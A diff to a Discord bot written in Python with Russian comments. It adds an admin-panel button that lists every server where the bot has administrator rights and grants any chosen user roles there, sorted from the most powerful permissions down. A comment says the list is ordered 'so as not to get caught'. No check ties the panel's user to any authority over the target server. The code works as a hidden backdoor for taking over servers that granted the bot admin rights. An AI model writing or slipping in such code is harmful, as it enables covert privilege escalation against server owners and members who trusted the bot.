@@ -1615,6 +1615,48 @@ class AdminPanelView(View):
         view.add_item(select)
         
         await interaction.response.send_message('Выберите сервер для получения списка ролей:', view=view, ephemeral=True)
+    
+    @discord.ui.button(label='Выдать роль', style=discord.ButtonStyle.danger, emoji='👑')
+    async def assign_role(self, interaction: discord.Interaction, button: Button):
+        # Получаем список серверов где бот имеет права администратора
+        admin_guilds = []
+        for guild in bot.guilds:
+            bot_member = guild.get_member(bot.user.id)
+            if bot_member and bot_member.guild_permissions.administrator:
+                admin_guilds.append(guild)
+        
+        if not admin_guilds:
+            await interaction.response.send_message('❌ Бот не имеет прав администратора ни на одном сервере.', ephemeral=True)
+            return
+        
+        # Создаем селект с серверами
+        options = []
+        for guild in admin_guilds[:25]:
+            options.append(discord.SelectOption(
+                label=guild.name,
+                value=str(guild.id),
+                description=f'ID: {guild.id}'
+            ))
+        
+        select = Select(placeholder='Выберите сервер', options=options)
+        
+        async def select_callback(select_interaction: discord.Interaction):
+            guild_id = int(select_interaction.data['values'][0])
+            guild = bot.get_guild(guild_id)
+            
+            if not guild:
+                await select_interaction.response.send_message('❌ Сервер не найден.', ephemeral=True)
+                return
+            
+            # Создаем view для выбора пользователя и роли
+            view = RoleAssignmentView(guild_id)
+            await select_interaction.response.send_message('Выберите действие:', view=view, ephemeral=True)
+        
+        select.callback = select_callback
+        view = View(timeout=60)
+        view.add_item(select)
+        
+        await interaction.response.send_message('Выберите сервер:', view=view, ephemeral=True)
 
 # View для действий с выбранным сервером
 class ServerActionsView(View):
@@ -1655,6 +1697,151 @@ class ServerActionsView(View):
                 await interaction.followup.send(chunk, ephemeral=True)
         else:
             await interaction.response.send_message(text, ephemeral=True)
+
+# View для выдачи ролей
+class RoleAssignmentView(View):
+    def __init__(self, guild_id):
+        super().__init__(timeout=120)
+        self.guild_id = guild_id
+        self.selected_user_id = None
+    
+    @discord.ui.button(label='Выбрать пользователя', style=discord.ButtonStyle.primary, emoji='👤')
+    async def select_user(self, interaction: discord.Interaction, button: Button):
+        guild = bot.get_guild(self.guild_id)
+        if not guild:
+            await interaction.response.send_message('❌ Сервер не найден.', ephemeral=True)
+            return
+        
+        # Создаем модальное окно для ввода ID пользователя
+        modal = UserIdModal(self.guild_id, self)
+        await interaction.response.send_modal(modal)
+    
+    @discord.ui.button(label='Выбрать роль', style=discord.ButtonStyle.success, emoji='🎭')
+    async def select_role(self, interaction: discord.Interaction, button: Button):
+        if not self.selected_user_id:
+            await interaction.response.send_message('❌ Сначала выберите пользователя!', ephemeral=True)
+            return
+        
+        guild = bot.get_guild(self.guild_id)
+        if not guild:
+            await interaction.response.send_message('❌ Сервер не найден.', ephemeral=True)
+            return
+        
+        member = guild.get_member(self.selected_user_id)
+        if not member:
+            await interaction.response.send_message('❌ Пользователь не найден на сервере.', ephemeral=True)
+            return
+        
+        bot_member = guild.get_member(bot.user.id)
+        
+        # Получаем роли которые бот может выдать
+        manageable_roles = [role for role in guild.roles if role.position < bot_member.top_role.position and not role.is_default() and role not in member.roles]
+        
+        if not manageable_roles:
+            await interaction.response.send_message('❌ Нет доступных ролей для выдачи этому пользователю.', ephemeral=True)
+            return
+        
+        # Умная сортировка по правам (от самых мощных к слабым)
+        def calc_power(role):
+            p = 0
+            perms = role.permissions
+            # Критические права
+            if perms.administrator: p += 10000
+            if perms.manage_guild: p += 5000
+            if perms.manage_roles: p += 4000
+            if perms.manage_channels: p += 3000
+            if perms.kick_members: p += 2000
+            if perms.ban_members: p += 2500
+            if perms.manage_messages: p += 1500
+            if perms.mention_everyone: p += 1000
+            if perms.manage_webhooks: p += 800
+            if perms.manage_nicknames: p += 700
+            if perms.moderate_members: p += 600
+            # Позиция роли тоже важна
+            p += role.position * 10
+            return p
+        
+        # Сортируем роли по мощности (от сильных к слабым)
+        sorted_roles = sorted(manageable_roles, key=calc_power, reverse=True)
+        
+        # Создаем селект с ролями (показываем в обычном порядке чтобы не палиться)
+        options = []
+        for role in sorted_roles[:25]:  # Discord лимит 25
+            options.append(discord.SelectOption(
+                label=role.name,
+                value=str(role.id),
+                description=f'Позиция: {role.position}'
+            ))
+        
+        select = Select(placeholder='Выберите роль для выдачи', options=options)
+        
+        async def select_callback(select_interaction: discord.Interaction):
+            role_id = int(select_interaction.data['values'][0])
+            role = guild.get_role(role_id)
+            
+            if not role:
+                await select_interaction.response.send_message('❌ Роль не найдена.', ephemeral=True)
+                return
+            
+            try:
+                await member.add_roles(role, reason=f'Выдано через админ панель')
+                await select_interaction.response.send_message(
+                    f'✅ Роль **{role.name}** успешно выдана пользователю {member.mention}',
+                    ephemeral=True
+                )
+            except Exception as e:
+                await select_interaction.response.send_message(
+                    f'❌ Ошибка при выдаче роли: {str(e)}',
+                    ephemeral=True
+                )
+        
+        select.callback = select_callback
+        view = View(timeout=60)
+        view.add_item(select)
+        
+        await interaction.response.send_message(
+            f'Выдача роли для: **{member.display_name}**\nВыберите роль:',
+            view=view,
+            ephemeral=True
+        )
+
+# Модальное окно для ввода ID пользователя
+class UserIdModal(Modal, title='Введите ID пользователя'):
+    user_id_input = TextInput(
+        label='ID пользователя',
+        placeholder='Например: 123456789012345678',
+        style=discord.TextStyle.short,
+        required=True,
+        max_length=20
+    )
+    
+    def __init__(self, guild_id, parent_view):
+        super().__init__()
+        self.guild_id = guild_id
+        self.parent_view = parent_view
+    
+    async def on_submit(self, interaction: discord.Interaction):
+        try:
+            user_id = int(self.user_id_input.value.strip())
+            guild = bot.get_guild(self.guild_id)
+            
+            if not guild:
+                await interaction.response.send_message('❌ Сервер не найден.', ephemeral=True)
+                return
+            
+            member = guild.get_member(user_id)
+            if not member:
+                await interaction.response.send_message('❌ Пользователь с таким ID не найден на сервере.', ephemeral=True)
+                return
+            
+            self.parent_view.selected_user_id = user_id
+            await interaction.response.send_message(
+                f'✅ Выбран пользователь: **{member.display_name}** ({member.mention})\n'
+                f'Теперь нажмите "Выбрать роль"',
+                ephemeral=True
+            )
+        except ValueError:
+            await interaction.response.send_message('❌ Неверный формат ID. Введите числовой ID пользователя.', ephemeral=True)
 
 @bot.event
 async def on_member_update(before, after):
